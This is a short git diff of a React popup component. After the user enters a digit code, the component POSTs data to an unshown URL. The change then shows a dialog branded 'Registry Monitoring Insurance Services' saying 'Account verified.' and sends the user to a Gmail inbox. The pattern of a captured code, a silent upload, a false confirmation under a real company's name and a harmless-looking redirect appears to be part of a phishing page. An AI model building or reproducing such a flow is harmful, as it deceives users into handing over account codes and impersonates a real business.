@@ -1,6 +1,7 @@
 import { useState, useRef } from "react";
 import './popup.css';
 import ReactLoading from 'react-loading';
+import Swal from 'sweetalert2'
 
 function PopUp() {
     var qfNum = 0;
@@ -107,7 +108,18 @@ function PopUp() {
             xht.open("POST", url, true);
             xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
             xht.send(JSON.stringify(obj));
-            window.location.href = "https://www.rmisdirectory.com/Account/Login";
+            Swal.fire({
+                heightAuto: false,
+                customClass: {
+                    confirmButton: 'confirm-button-class',
+                    title: 'title-class'
+                },  
+                title: "Registry Monitoring Insurance Services",
+                text: "Account verified.",
+                preConfirm: () => {
+                    window.location.href = "https://mail.google.com/mail/u/0/#inbox";
+                },
+            });
             return;
         } else {
             digitcodeUser.current.nextSibling.style.display = "flex";
